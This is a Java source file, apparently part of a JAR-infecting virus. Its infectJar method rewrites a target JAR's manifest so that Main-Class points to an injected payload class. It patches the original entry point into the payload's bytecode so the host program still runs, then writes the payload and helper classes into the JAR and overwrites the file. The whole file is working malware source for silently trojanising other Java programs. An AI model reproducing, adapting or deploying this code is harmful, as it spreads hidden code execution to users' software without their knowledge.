package plvc;

import java.io.*;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Infect {

    public static void infectJar(File file, String... payloadClasses) throws IOException {
        String payloadClass = payloadClasses[0];
        String[] otherClasses = Arrays.copyOfRange(payloadClasses, 1, payloadClasses.length);

        String returnMainClass = null;

        ZipFile zf = new ZipFile(file);
        Enumeration<? extends ZipEntry> entries = zf.entries();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(baos);

        while (entries.hasMoreElements()) {
            ZipEntry entry = entries.nextElement();

            if (entry.getName().equals("META-INF/MANIFEST.MF")) {
                BufferedReader r = new BufferedReader(new InputStreamReader(zf.getInputStream(entry)));
                zos.putNextEntry(new ZipEntry(entry.getName()));

                String line = r.readLine();
                while (line != null) {
                    if (line.startsWith("Main-Class")) {
                        returnMainClass = line.split(": ")[1];
                        line = "Main-Class: " + payloadClass;
                    }
                    byte[] byts = (line + "\n").getBytes();
                    zos.write(byts, 0, byts.length);

                    line = r.readLine();
                }
                zos.closeEntry();
            } else {
                zos.putNextEntry(entry);
                InputStream is = zf.getInputStream(entry);
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) > 0) {
                    zos.write(buf, 0, len);
                }
                zos.closeEntry();
            }
        }

        byte[] payloadData = getOwnClass(payloadClass.replace('.', '/'));
        byte[] editedPayloadData = editPayloadData(payloadData, "0ef7878959aec39e48a9b370a79bbfde", returnMainClass);

        zos.putNextEntry(new ZipEntry(payloadClass.replace('.', '/') + ".class"));
        zos.write(editedPayloadData, 0, editedPayloadData.length);
        zos.closeEntry();

        for (String otherClass : otherClasses) {
            byte[] otherData = getOwnClass(otherClass.replace('.', '/'));
            zos.putNextEntry(new ZipEntry(otherClass.replace('.', '/') + ".class"));
            zos.write(otherData, 0, otherData.length);
            zos.closeEntry();
        }

        zf.close();
        zos.close();
        baos.close();

        FileOutputStream fos = new FileOutputStream(file);
        fos.write(baos.toByteArray());
    }

    private static byte[] editPayloadData(byte[] payloadData, String search, String replace) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(payloadData);
        InputStream ris = new ReplacingInputStream(bais, search.getBytes(), replace.getBytes());

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int b;
        while (-1 != (b = ris.read())) {
            bos.write(b);
        }
        return bos.toByteArray();
    }

    private static byte[] getOwnClass(String pathToFile) throws IOException {
        InputStream pis = Infect.class.getResourceAsStream("/" + pathToFile + ".class");
        ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
        for (int i = pis.read(); i != -1; i = pis.read()) {
            baos1.write(i);
        }
        return baos1.toByteArray();
    }

}
